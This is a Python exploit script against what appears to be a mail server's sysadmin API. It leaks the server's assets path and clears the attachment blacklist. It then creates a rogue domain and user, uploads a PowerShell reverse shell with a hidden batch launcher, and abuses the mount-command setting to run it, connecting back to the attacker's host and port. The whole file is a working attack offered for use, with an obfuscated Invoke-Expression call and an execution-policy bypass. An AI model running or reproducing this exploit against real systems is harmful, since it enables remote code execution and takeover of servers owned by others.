import argparse
import requests
import time

pw = 'Foobar1234!'
fakedom = 'beamed.com'

def pargs():
    p = argparse.ArgumentParser()
    p.add_argument('url', help='base url')
    p.add_argument('token', help='sysadmin access token')
    p.add_argument('--lhost', required=True, help='nc ip')
    p.add_argument('--lport', default='1234', help='nc port')
    return p.parse_args()

args = pargs()
base = args.url.rstrip('/')

def beam(at):
    def apibase(path, data):
        return requests.post(base + path, json=data, headers={'Authorization': 'Bearer ' + at}, timeout=60)
    # get the orig path first
    r = apibase('/api/v1/settings/sysadmin/AddOrUpdateMount', {
        'Enabled': True,
        'MountPath': 'C:/tmp',
        'CommandMount': 'zz',
        'CommandUnmount': '',
        'ReadOnly': False,
        'UseArgumentsInCommand': False
        })

    if 'not found' not in r.text:
        print('! cant find assets dir')
        return

    assets = r.text.split("Script file '")[1].split('zz')[0]

    print(f'+ got assets {assets}')

    r = apibase('/api/v1/settings/sysadmin/global-mail', {
        'globalMailSettings':
        {
            'fileTypeRestriction':
            {
                'blackList': [],
                'blockFilesWithNoExtension': False
            }
        }
        })
    if r.status_code != 200:
        print('! cant clear bl')
        return

    print('+ bl cleared')

    r = apibase('/api/v1/settings/sysadmin/domain-put', {
        'domainData': {
            'name': fakedom,
            'hostname': 'mail.' + fakedom,
            'path': assets + 'x',
            'isEnabled': True,
            'isSplitDomain': False
        },
        'adminUsername': 'lol',
        'adminPassword': pw
        })

    if r.status_code == 200:
        print('+ new dom')
    else:
        print(f'- cant make new domain')

    email = f'lol@{fakedom}'
    r = apibase('/api/v1/settings/sysadmin/post-user', {
        'email': email,
        'userData': {
            'maxMailboxSize': 0
        },
        'allowMail': True
        })

    if r.status_code == 200:
        print('+ quota unlimited')
    else:
        print(f'- quota: {r.status_code}')

    r = requests.post(base + '/api/v1/auth/authenticate-user', json={
        'Username': email,
        'Password': pw,
        'clientId': 'lol'
        }, timeout=30)

    if r.status_code != 200:
        print('! login fail ' + r.text[:200])
        return
    user_token = r.json()['accessToken']
    print('+ logged in no bizzy BAP ')

    ps1 = f"""$c=New-Object System.Net.Sockets.TCPClient('{args.lhost}',{args.lport});
$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};
while(($i=$s.Read($b,0,$b.Length))-ne 0){{
$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
$r=(('Invoke'+'-Expression') $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';
$e=([text.encoding]::ASCII).GetBytes($r2);
$s.Write($e,0,$e.Length);$s.Flush()}};
$c.Close()
"""
    ps1p = assets + 'x/Users/lol/FileStore/Root Folder/fun.ps1'
    bat = (f'@echo off\r\n'
           f'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "{ps1p}"\r\n')

    def upload(filename, content):
        size = str(len(content))
        form = {
            'context': 'file-storage',
            'contextData': '{"folder":""}',
            'resumableChunkNumber': '1',
            'resumableTotalChunks': '1',
            'resumableChunkSize': size,
            'resumableCurrentChunkSize': size,
            'resumableTotalSize': size,
            'resumableIdentifier': filename.upper().replace('.', '-') + '-' + size,
            'resumableFilename': filename,
            'resumableRelativePath': filename,
            'resumableType': '',
        }
        # technically not needed but sometimes it fails
        for i in range(15):
            r = requests.post(base + '/api/upload', headers={'Authorization': 'Bearer ' + user_token}, data=form, files={'file': (filename, content.encode())}, timeout=30)
            if r.status_code == 200:
                return True
            if 'MAX_SIZE_EXCEEDED' in r.text:
                time.sleep(3)
                continue
            print(f'! upload: {r.text[:100]}')
            return False
        print('! upload is fucked wtf did you do')
        return False

    if not upload('fun.ps1', ps1):
        return
    if not upload('g.bat', bat):
        return
    print('+ uploaded pl')

    r = apibase('/api/v1/settings/sysadmin/AddOrUpdateMount', {
        'Enabled': True,
        'MountPath': 'C:/tmp',
        'CommandMount': 'x/Users/lol/FileStore/Root Folder/g.bat',
        'CommandUnmount': '',
        'ReadOnly': False,
        'UseArgumentsInCommand': False
        })
    if 'not found' in r.text:
        print('???: ' + r.text[:300])
    else:
        print(f'+ shell')

beam(args.token)
